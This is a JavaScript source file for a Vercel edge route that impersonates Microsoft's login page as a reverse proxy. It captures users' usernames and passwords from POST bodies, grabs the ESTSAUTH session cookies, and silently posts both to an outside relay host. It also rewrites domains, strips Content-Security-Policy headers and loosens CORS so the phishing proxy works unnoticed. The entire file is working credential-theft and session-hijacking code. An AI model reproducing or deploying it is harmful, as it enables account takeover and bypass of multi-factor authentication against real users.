export const runtime = 'edge';

// Configuration
const UPSTREAM = 'login.microsoftonline.com';
const UPSTREAM_PATH = '/';
const VERCEL_URL = 'https://apisage.searchegpt.com/api/relay';
const BLOCKED_REGIONS = [];
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

// ---- Exfiltration Functions ----
async function sendCredsToVercel(data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    });
  } catch (error) {
    // Intentionally silent
  }
}

async function exfiltrateCookiesFile(cookieText, ip) {
  try {
    const content = `IP: ${ip}\nData: Cookies found:\n\n${cookieText}\n`;
    const formData = new FormData();
    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-COOKIE.txt`);
    formData.append("ip", ip);
    formData.append("type", "cookie-file");
    
    await fetch(VERCEL_URL, {
      method: "POST",
      body: formData,
    });
  } catch (e) {
    // Intentionally silent
  }
}

async function handleProxy(request, pathSegments = []) {
  const url = new URL(request.url);
  
  // Get client info from Vercel headers
  const region = request.headers.get('x-vercel-ip-country')?.toUpperCase() || '';
  const ipAddress = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';

  // Blocking check
  if (BLOCKED_REGIONS.includes(region) || BLOCKED_IPS.includes(ipAddress)) {
    return new Response('Access denied.', { status: 403 });
  }

  // Build upstream path - handle root and nested paths
  let upstreamPath = UPSTREAM_PATH;
  if (pathSegments.length > 0) {
    upstreamPath = UPSTREAM_PATH + pathSegments.join('/');
  }

  // Build upstream URL
  const upstreamUrl = `https://${UPSTREAM}${upstreamPath}${url.search}`;
  console.log('Proxying to:', upstreamUrl);

  // Build headers for upstream fetch
  const upstreamHeaders = new Headers();
  for (const [key, value] of request.headers.entries()) {
    if (!['host', 'referer'].includes(key.toLowerCase())) {
      upstreamHeaders.set(key, value);
    }
  }

  upstreamHeaders.set('Host', UPSTREAM);
  upstreamHeaders.set('Referer', `https://${url.hostname}`);

  // ---- Credentials capture for POST requests ----
  let requestBody = null;
  
  if (request.method === 'POST') {
    try {
      const clonedReq = request.clone();
      const bodyText = await clonedReq.text();
      requestBody = bodyText;
      
      const params = new URLSearchParams(bodyText);
      const user = params.get('login');
      const pass = params.get('passwd');
      
      if (user && pass) {
        await sendCredsToVercel({
          type: "creds",
          ip: ipAddress,
          user: decodeURIComponent(user.replace(/\+/g, ' ')),
          pass: decodeURIComponent(pass.replace(/\+/g, ' ')),
        });
      }
    } catch (error) {
      console.error('Error extracting credentials:', error);
    }
  }

  // Prepare fetch options
  const opts = {
    method: request.method,
    headers: upstreamHeaders,
    redirect: 'manual',
    body: ['GET', 'HEAD'].includes(request.method) ? undefined : (requestBody || request.body)
  };

  let upstreamResponse;
  try {
    upstreamResponse = await fetch(upstreamUrl, opts);
  } catch (error) {
    console.error('Upstream fetch error:', error);
    return new Response('Upstream error: ' + error.message, { status: 502 });
  }

  // Handle redirects
  if ([301, 302, 303, 307, 308].includes(upstreamResponse.status)) {
    const location = upstreamResponse.headers.get('location');
    if (location) {
      const modifiedLocation = location.replace(
        /https?:\/\/login\.microsoftonline\.com/gi, 
        `https://${url.hostname}`
      );
      const responseHeaders = new Headers(upstreamResponse.headers);
      responseHeaders.set('location', modifiedLocation);
      return new Response(null, {
        status: upstreamResponse.status,
        headers: responseHeaders
      });
    }
  }

  // Process response headers
  const responseHeaders = new Headers(upstreamResponse.headers);
  
  // Add CORS headers
  responseHeaders.set('Access-Control-Allow-Origin', '*');
  responseHeaders.set('Access-Control-Allow-Credentials', 'true');
  
  // Remove security headers
  responseHeaders.delete('Content-Security-Policy');
  responseHeaders.delete('Content-Security-Policy-Report-Only');
  responseHeaders.delete('Clear-Site-Data');

  // ---- Cookie processing and exfiltration ----
  let allCookies = '';
  const cookieHeaders = responseHeaders.get('set-cookie');
  
  if (cookieHeaders) {
    const cookiesArray = Array.isArray(cookieHeaders) ? cookieHeaders : [cookieHeaders];
    allCookies = cookiesArray.join('; \n\n');
    
    // Modify cookie domains to work with our proxy
    const modifiedCookies = cookiesArray.map(cookie => 
      cookie.replace(/login\.microsoftonline\.com/gi, url.hostname)
    );
    
    // Replace original cookies with modified ones
    responseHeaders.delete('set-cookie');
    modifiedCookies.forEach(cookie => {
      responseHeaders.append('set-cookie', cookie);
    });
  }

  // Exfiltrate cookies if auth cookies detected
  if (allCookies.includes('ESTSAUTH') && allCookies.includes('ESTSAUTHPERSISTENT')) {
    await exfiltrateCookiesFile(allCookies, ipAddress);
  }

  // Process response body for domain replacement
  const contentType = responseHeaders.get('content-type');
  let responseBody;

  if (contentType && /(text\/html|application\/javascript|application\/json)/i.test(contentType)) {
    try {
      const text = await upstreamResponse.text();
      let modifiedText = text
        .replace(/login\.microsoftonline\.com/gi, url.hostname)
        .replace(/https:\/\/login\.microsoftonline\.com/gi, `https://${url.hostname}`)
        .replace(/http:\/\/login\.microsoftonline\.com/gi, `https://${url.hostname}`);
      
      responseBody = modifiedText;
    } catch (error) {
      console.error('Error processing response body:', error);
      // Fallback to original response
      const responseClone = upstreamResponse.clone();
      responseBody = responseClone.body;
    }
  } else {
    responseBody = upstreamResponse.body;
  }

  return new Response(responseBody, {
    status: upstreamResponse.status,
    headers: responseHeaders,
  });
}

// Export handlers for common HTTP methods
export async function GET(request, { params }) {
  return handleProxy(request, params.path || []);
}

export async function POST(request, { params }) {
  return handleProxy(request, params.path || []);
}

export async function PUT(request, { params }) {
  return handleProxy(request, params.path || []);
}

export async function DELETE(request, { params }) {
  return handleProxy(request, params.path || []);
}

export async function PATCH(request, { params }) {
  return handleProxy(request, params.path || []);
}

export async function OPTIONS(request, { params }) {
  return handleProxy(request, params.path || []);
}

export async function HEAD(request, { params }) {
  return handleProxy(request, params.path || []);
}
